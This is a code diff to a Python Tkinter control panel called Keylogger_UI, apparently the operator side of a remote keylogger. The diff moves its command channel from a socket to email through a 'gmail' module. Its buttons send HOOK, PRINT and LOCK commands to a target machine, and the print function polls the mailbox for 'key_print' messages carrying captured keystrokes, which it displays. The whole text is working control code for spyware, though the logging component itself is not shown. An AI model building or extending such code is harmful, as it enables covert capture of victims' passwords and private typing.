@@ -1,5 +1,6 @@
 import tkinter as tk
 from tkinter import Canvas, Text, Button, PhotoImage
+import gmail as g
 
 BUFSIZE = 1024
 
@@ -16,24 +17,30 @@ def abs_path(file_name):
 
     return os.path.join(base_path, file_name)
 
-def hook(client, btn):
-    client.sendall(bytes("HOOK", "utf8"))
+def hook(btn):
+    g.send_mail("HOOK")
     if btn['text'] == "HOOK":
         btn.configure(text = "UNHOOK")
     else:
         btn.configure(text = "HOOK")
     return
     
-def _print(client, textbox):
-    client.sendall(bytes("PRINT", "utf8"))
+def _print( textbox):
+    g.send_mail("PRINT")
     print("  ")
-    data = client.recv(BUFSIZE).decode("utf8")
-    #data = data.replace("'", "")
-    # data = data[1:]
-    textbox.config(state = "normal")
-    textbox.insert(tk.END, data)
-    textbox.config(state = "disable")
-    return
+    while True:
+        letter = g.read_mail()
+        if letter != "no":
+            tmp = letter.split(":")
+            cmd = tmp[0]
+            if cmd == "key_print":
+                data = tmp[1]
+                print("key_print:", data)
+                textbox.config(state = "normal")
+                textbox.insert(tk.END, data)
+                textbox.config(state = "disable")
+                return
+    
         
 def delete(textbox):
     textbox.config(state = "normal")
@@ -41,8 +48,8 @@ def delete(textbox):
     textbox.config(state = "disable")
     return
 
-def lock(client, btn):
-    client.sendall(bytes("LOCK", "utf8"))
+def lock(btn):
+    g.send_mail("LOCK")
     if btn['text'] == "LOCK":
         btn.configure(text = "UNLOCK")
     else:
@@ -53,7 +60,7 @@ def back():
     return
 
 class Keylogger_UI(Canvas):
-     def __init__(self, parent, client):    
+     def __init__(self, parent):    
         Canvas.__init__(self, parent)
         self.configure(
             #window,
@@ -89,7 +96,7 @@ class Keylogger_UI(Canvas):
             #image=button_image_2,
             borderwidth=0,
             highlightthickness=0,
-            command=lambda: hook(client, self.button_2),
+            command=lambda: hook(self.button_2),
             relief="flat"
         )
         self.button_2.place(
@@ -102,7 +109,7 @@ class Keylogger_UI(Canvas):
             #image=button_image_3,
             borderwidth=0,
             highlightthickness=0,
-            command=lambda: _print(client, self.text_1),
+            command=lambda: _print(self.text_1),
             relief="flat"
         )
         self.button_3.place(
@@ -128,7 +135,7 @@ class Keylogger_UI(Canvas):
             #image=button_image_5,
             borderwidth=0,
             highlightthickness=0,
-            command=lambda: lock(client, self.button_5),
+            command=lambda: lock(self.button_5),
             relief="flat"
         )
         self.button_5.place(
